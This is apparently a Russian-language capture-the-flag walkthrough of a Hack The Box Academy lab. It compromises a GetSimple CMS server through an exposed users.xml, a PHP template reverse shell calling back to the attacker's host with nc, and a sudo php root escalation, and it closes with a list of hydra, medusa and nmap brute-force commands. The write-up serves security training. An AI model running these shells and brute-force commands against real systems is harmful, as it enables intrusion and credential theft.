GettingStarted Walkthrough

1. Разведка (Enumeration)
Сначала я отсканировал порты с помощью nmap, чтобы понять, что открыто.
Nmap скан
Команда:
textnmap -sV -p- --open 10.129.20.166
Вывод:
textNmap scan report for 10.129.20.166
Host is up (0.054s latency).
Not shown: 998 closed tcp ports (reset)
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open http Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Открыто SSH на 22 и веб на 80. SSH свежий, не уязвимый, так что фокус на веб.
Дополнительный скан на HTTP:
textnmap -sV --script=http-enum -oA gettingstarted_http_enum 10.129.20.166
Вывод:
textPORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open http Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-enum:
| /admin/: Possible admin folder
| /admin/index.php: Possible admin folder
| /backups/: Backup folder w/ directory listing
| /robots.txt: Robots file
|_ /data/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
Нашёл интересные папки: /admin/, /backups/, /data/. Заголовок страницы показал, что это CMS GetSimple (версия 3.3.15, старая и с уязвимостями).
Gobuster для директорий
Команда:
textgobuster dir -u http://10.129.20.166/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
Вывод:
text/.hta (Status: 403) [Size: 278]
/.htaccess (Status: 403) [Size: 278]
/.htpasswd (Status: 403) [Size: 278]
/admin (Status: 301) [Size: 314] [--> http://10.129.20.166/admin/]
/backups (Status: 301) [Size: 316] [--> http://10.129.20.166/backups/]
/data (Status: 301) [Size: 313] [--> http://10.129.20.166/data/]
/index.php (Status: 200) [Size: 5485]
/plugins (Status: 301) [Size: 316] [--> http://10.129.20.166/plugins/]
/robots.txt (Status: 200) [Size: 32]
/server-status (Status: 403) [Size: 278]
/sitemap.xml (Status: 200) [Size: 431]
/theme (Status: 301) [Size: 314] [--> http://10.129.20.166/theme/]
Открытые папки с listing'ом (/data/, /backups/) — это ошибка настройки сервера. Там можно скачать файлы.
2. Получение доступа (Foothold)
Нашёл файл с creds в /data/:
textcurl http://10.129.20.166/data/users.xml
Вывод:
text<item>
<USR>admin</USR>
<NAME/>
<PWD>d033e22ae348aeb5660fc2140aec35850c4da997</PWD>
<EMAIL>admin@gettingstarted.com</EMAIL>
<HTMLEDITOR>1</HTMLEDITOR>
<TIMEZONE/>
<LANG>en_US</LANG>
</item>
Логин: admin
Пароль: admin (хэш соответствует "admin" — проверил с помощью john).
Вошёл в админ-панель: http://10.129.20.166/admin/ с admin:admin.
RCE через редактирование шаблона
В админке пошёл в Theme → Edit Theme → Innovation → template.php.
Заменил весь код на reverse shell:
PHP<?php
system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.155 4444 >/tmp/f");
?>
Сохранил.
Запустил listener:
textnc -lvnp 4444
Триггернул:
textcurl http://10.129.20.166/theme/Innovation/template.php
Получил шелл:
textconnect to [10.10.15.155] from (UNKNOWN) [10.129.20.166] 43480
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
Стабилизировал:
textpython3 -c 'import pty; pty.spawn("/bin/bash")'
Теперь в нормальном bash как www-data.
3. Эскалация привилегий (Privesc)
Проверил права:
textsudo -l
Вывод:
textMatching Defaults entries for www-data on gettingstarted:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
User www-data may run the following commands on gettingstarted:
    (ALL : ALL) NOPASSWD: /usr/bin/php
Можно запускать php от root без пароля.
Эксплойт:
textsudo /usr/bin/php -r 'pcntl_exec("/bin/sh", array("-i"));'
Получил root:
text# whoami
root
Флаги и завершение

User flag: в /home/htb/user.txt
Root flag: в /root/root.txt

Подтверждение: https://academy.hackthebox.com/achievement/2182889/77
Полезные команды, которые использовал

Полный SSH-enum: nmap -p22 --script ssh2-enum-algos,ssh-hostkey,ssh-auth-methods,ssh-publickey-acceptance <IP>
Brute SSH: hydra -t 4 -L /usr/share/seclists/Usernames/top-usernames.txt -P /usr/share/wordlists/rockyou.txt ssh://<IP>
Brute HTTP: hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> http-get /admin/
Brute form: hydra -l admin -P rockyou.txt <IP> http-post-form "/admin/login.php:user=^USER^&pass=^PASS^:F=incorrect" -V
Medusa (альтернатива Hydra): medusa -h <IP> -u user -P rockyou.txt -M ssh
Nmap brute: nmap -p22 --script ssh-brute --script-args userdb=/path/to/users.txt,passdb=rockyou.txt <IP>

Что узнал
GetSimple уязвим к RCE в theme-edit (CVE-2019-11231). Всегда чекать открытые папки /data/ для creds. Sudo на php — лёгкий privesc.